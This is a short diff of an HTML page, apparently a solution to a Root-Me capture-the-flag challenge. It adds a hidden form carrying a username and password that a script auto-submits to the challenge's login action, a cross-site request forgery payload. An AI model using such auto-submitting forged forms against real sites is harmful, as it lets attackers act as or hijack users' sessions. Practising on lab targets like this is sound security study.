@@ -5,9 +5,14 @@
         <input type="hidden" name="username" value="alberta">
         <input type="hidden" name="password" value="tata">
     </form>
+    <form id="csrf2" action="http://challenge01.root-me.org/web-client/ch22/?action=login" method="POST">
+        <input type="hidden" name="username" value="alberta">
+        <input type="hidden" name="password" value="tata">
+    </form>
 
     <script>
-        document.getElementById("csrf").submit();
+        <!--document.getElementById("csrf").submit();-->
+        document.getElementById("csrf2").submit();
     </script>
 </body>
 
